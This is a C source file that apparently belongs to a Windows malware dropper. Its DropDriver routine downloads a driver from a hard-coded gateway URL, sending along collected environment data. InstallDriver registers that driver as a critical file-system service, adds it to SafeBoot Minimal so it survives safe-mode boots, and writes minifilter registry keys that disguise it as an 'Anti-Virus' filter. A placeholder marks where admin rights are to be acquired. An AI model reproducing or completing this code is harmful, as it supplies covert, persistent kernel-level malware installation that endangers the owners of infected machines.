#include "driver_installation.h"


BOOL DriverFileExists(LPWSTR lpszDriverName) {
	BOOL status = FALSE;
	HANDLE hFile = INVALID_HANDLE_VALUE;
	WCHAR filePath[MAX_PATH], szAppDataPath[MAX_PATH];
	ZeroBuffer(szAppDataPath, MAX_PATH);
	ZeroBuffer(filePath, MAX_PATH);
	ExpandEnvironmentStringsW(APPDATA_STR, szAppDataPath, MAX_PATH);
	_wsprintfW(filePath, DLL_PATH_STR, szAppDataPath, lpszDriverName);
	hFile = CreateFileW(filePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		CloseHandle(hFile);
		status = TRUE;
	}
	return status;
}

BOOL DropDriver(LPWSTR lpszDriverName)
{
	BOOL status = FALSE;
	WCHAR szDriverPath[MAX_PATH], szAppDataPath[MAX_PATH], *lpszDownload_Url = NULL;
	ZeroBuffer(szDriverPath, MAX_PATH);
	ZeroBuffer(szAppDataPath, MAX_PATH);
	ExpandEnvironmentStringsW(APPDATA_STR, szAppDataPath, MAX_PATH);
	_wsprintfW(szDriverPath, DLL_PATH_STR, szAppDataPath, lpszDriverName);
	lpszDownload_Url = _HeapAlloc(_GetProcessHeap(), 0, MAX_PATH);
	ZeroBuffer(lpszDownload_Url, MAX_PATH);
	if (lpszDownload_Url != NULL) {
		LPWSTR Env = NULL;
		GetEnviroment(Env);
		if (Env != NULL) {
			_wsprintfW(lpszDownload_Url, FORMAT_TYPE, GATEWAY_URL, lpszDriverName, Env);

			if (DownloadFileToFile(szDriverPath, lpszDownload_Url, MAX_PATH)) {
				status = TRUE;
			}
			HeapFree(GetProcessHeap(), 0, Env);
		}

		HeapFree(GetProcessHeap(), 0, lpszDownload_Url);
	}
	return status;
}

/*/

*/



BOOL SetupFSDriverRegistry(LPWSTR lpszService) {
	BOOL status = FALSE;
	HKEY startup = NULL;
	
	DWORD disp = 0;
	DWORD lpData = 0x3;
	DWORD lpdwSize = 0;
	BOOL bIsAdmin = QueryAdminStatus();
	if (!bIsAdmin) {
		// acquire admin here..
		

		//now check again
		bIsAdmin = QueryAdminStatus();
	}
	if (bIsAdmin) {
		WCHAR lpSubKey[MAX_PATH];
		ZeroBuffer(lpSubKey, MAX_PATH);
		_wsprintfW(lpSubKey, L"%s%s", SERVICES_REG, lpszService);
		LSTATUS lStatus = RegCreateKeyExW(HKEY_LOCAL_MACHINE, lpSubKey, 0, NULL, 0, KEY_ALL_ACCESS, NULL, &startup, &disp);
		if (lStatus != ERROR_SUCCESS)
			goto cleanup;
		
		lStatus = RegSetValueExW(startup, L"SupportedFeatures", 0, REG_DWORD, (LPCBYTE)&lpData, sizeof(lpData));
		if (lStatus != ERROR_SUCCESS)
			goto cleanup;
		
		lpData = 0;
		lStatus = RegSetValueExW(startup, L"DebugFlags", 0, REG_DWORD, (LPCBYTE)&lpData, sizeof(lpData));
		if (lStatus != ERROR_SUCCESS)
			goto cleanup;

		WCHAR fltMgr[] = L"fltmgr";
		lStatus = RegSetValueExW(startup, L"DependOnService", 0, REG_MULTI_SZ, (LPCBYTE)fltMgr, (wcslen(fltMgr) + 1) * sizeof(WCHAR));
		if (lStatus != ERROR_SUCCESS)
			goto cleanup;

		WCHAR szDescription[MAX_PATH];
		ZeroBuffer(szDescription, MAX_PATH);
		_wsprintfW(szDescription, L"%s Mini-Filter Driver", lpszService);
		lStatus = RegSetValueExW(startup, L"Description", 0, REG_SZ, (LPCBYTE)szDescription, (wcslen(szDescription) + 1) * sizeof(WCHAR));
		if (lStatus != ERROR_SUCCESS)
			goto cleanup;

		WCHAR Group[MAX_PATH];
		ZeroBuffer(Group, MAX_PATH);
		_wsprintfW(Group, L"%s Anti-Virus", lpszService);
		lStatus = RegSetValueExW(startup, L"Group", 0, REG_SZ, (LPCBYTE)Group, (wcslen(Group) + 1) * sizeof(WCHAR));
		if (lStatus != ERROR_SUCCESS)
			goto cleanup;

		lpData = 0x2;
		lStatus = RegSetValueExW(startup, L"Tag", 0, REG_DWORD, (LPCBYTE)&lpData, sizeof(lpData));
		if (lStatus != ERROR_SUCCESS)
			goto cleanup;

		lStatus = RegCloseKey(startup);
		if (lStatus != ERROR_SUCCESS)
			goto cleanup;

		_wsprintfW(lpSubKey, L"%s\\%s", lpSubKey, L"Instances");
		WCHAR instance[MAX_PATH];
		ZeroBuffer(instance, MAX_PATH);
		_wsprintfW(instance, L"%s Instance", lpszService);
		lStatus = RegCreateKeyExW(HKEY_LOCAL_MACHINE, lpSubKey, 0, NULL, 0, KEY_ALL_ACCESS, NULL, &startup, &disp);
		if (lStatus != ERROR_SUCCESS)
			goto cleanup;

		lStatus = RegSetValueExW(startup, L"DefaultInstance", 0, REG_SZ, (LPCBYTE)instance, (wcslen(instance) + 1) * sizeof(WCHAR));
		if (lStatus != ERROR_SUCCESS)
			goto cleanup;

		lStatus = RegCloseKey(startup);
		if (lStatus != ERROR_SUCCESS)
			goto cleanup;

		_wsprintfW(lpSubKey, L"%s\\%s Instance", lpSubKey, lpszService);
		lStatus = RegCreateKeyExW(HKEY_LOCAL_MACHINE, lpSubKey, 0, NULL, 0, KEY_ALL_ACCESS, NULL, &startup, &disp);
		if (lStatus != ERROR_SUCCESS)
			goto cleanup;

		lpData = 0x00;
		lStatus = RegSetValueExW(startup, L"Flags", 0, REG_DWORD, (LPCBYTE)&lpData, sizeof(lpData));
		if (lStatus != ERROR_SUCCESS)
			goto cleanup;

		WCHAR altitude[] = L"320003";
		lStatus = RegSetValueExW(startup, L"Altitude", 0, REG_SZ, (LPCBYTE)altitude, sizeof(altitude));
		if (lStatus != ERROR_SUCCESS)
			goto cleanup;

		lStatus = RegCloseKey(startup);
		if (lStatus != ERROR_SUCCESS)
			goto cleanup;

		status = TRUE;
	}
cleanup:
	if (startup)
		RegCloseKey(startup);

	return status;
}





BOOL InstallDriver(LPWSTR lpszDriverName, LPWSTR lpszDriverServiceName) {
	BOOL status = FALSE;
	WCHAR Path[MAX_PATH], szAppDataPath[MAX_PATH];
	ZeroBuffer(Path, MAX_PATH);
	ZeroBuffer(szAppDataPath, MAX_PATH);
	ExpandEnvironmentStringsW(APPDATA_STR, szAppDataPath, MAX_PATH);
	_wsprintfW(Path, DLL_PATH_STR, szAppDataPath, lpszDriverName);
	status = InstallService(Path, lpszDriverServiceName, lpszDriverServiceName, SERVICE_ALL_ACCESS | SERVICE_STOP | DELETE,
		SERVICE_FILE_SYSTEM_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_CRITICAL);
	if (!status)
		goto cleanup;

	status = SafeBootStartup(L"Minimal", lpszDriverServiceName);

	if (!status)
		goto cleanup;

	status = SetupFSDriverRegistry(lpszDriverServiceName);

cleanup:

	return status;
}
